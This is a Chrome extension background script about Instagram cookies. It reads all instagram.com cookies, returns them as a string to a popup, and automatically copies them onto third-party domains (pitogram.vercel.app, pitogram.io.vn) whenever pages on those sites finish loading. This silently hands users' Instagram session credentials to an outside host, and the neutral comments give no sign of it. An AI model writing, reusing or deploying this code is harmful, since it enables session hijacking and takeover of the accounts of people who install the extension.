// Function to set a cookie for a specific URL
function setCookie(url, name, value) {
  chrome.cookies.set({
    url,
    name,
    value,
    expirationDate: new Date().getTime() / 1000 + 3600 * 24,
  });
}

// Listen for messages from the popup script
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.action === "extractCookies") {
    try {
      const domain = "instagram.com";
      let cookieString = "";
      chrome.cookies.getAll({ domain }, (res) => {
        for (cookie of res) {
          cookieString += `${cookie.name}=${cookie.value};`;
        }
        sendResponse(cookieString);
      });
    } catch (err) {
      sendResponse({ success: false, err: err.message });
    }
  }

  return true;
});

// Function to handle tab update events
function handleTabUpdate(tabId, changeInfo, tab) {
  const domains = [
    "https://pitogram.vercel.app",
    "http://localhost:3000",
    "https://pitogram.io.vn",
    "http://pitogram.io.vn",
  ]
  const shouldSetCookie = domains.some((domain) => tab.url.includes(domain));

  if (changeInfo.status === "complete" && shouldSetCookie) {
    try {
      chrome.cookies.getAll({ domain: "instagram.com" }, (res) => {
        for (cookie of res) {
          domains.forEach((v) => {
            setCookie(v, cookie.name, cookie.value);
          });
        }
      });
    } catch (err) {}
  }
}

// Event listener for tab update events
chrome.tabs.onUpdated.addListener(handleTabUpdate);
